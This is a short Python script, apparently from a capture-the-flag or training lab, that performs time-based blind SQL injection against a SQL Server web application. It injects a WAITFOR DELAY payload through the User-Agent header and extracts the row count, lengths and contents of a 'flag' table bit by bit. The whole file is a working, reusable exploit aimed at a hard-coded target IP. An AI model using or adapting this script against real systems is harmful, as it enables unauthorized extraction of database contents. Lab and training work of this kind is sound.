#!/usr/bin/python3

import requests
import time

# Define the length of time (in seconds) the server should
# wait if `q` is `true`
DELAY = 1
ip = "10.129.204.197"
# Evalutes `q` on the server side and returns `true` or `false`
def oracle(q):
    start = time.time()
    r = requests.get(
        f"http://{ip}:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start > DELAY

def dumpString(q, length):
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val

def dumpNumber(q):
    length = 0
    for p in range(7):
        if oracle(f"({q})&{2**p}>0"):
            length |= 2**p
    return length

# Get Tables Length
query = "SELECT COUNT(*) FROM flag"
num_rows = dumpNumber(query)
print(num_rows)
# Get Table Name
for i in range(num_rows):
    query = f"select LEN(flag) from flag order by flag offset {i} rows fetch next 1 rows only"
    row_length = dumpNumber(query)
    print(row_length)
    query = f"select flag from flag order by flag offset {i} rows fetch next 1 rows only"
    row_data = dumpString(query, row_length)
    print(row_data)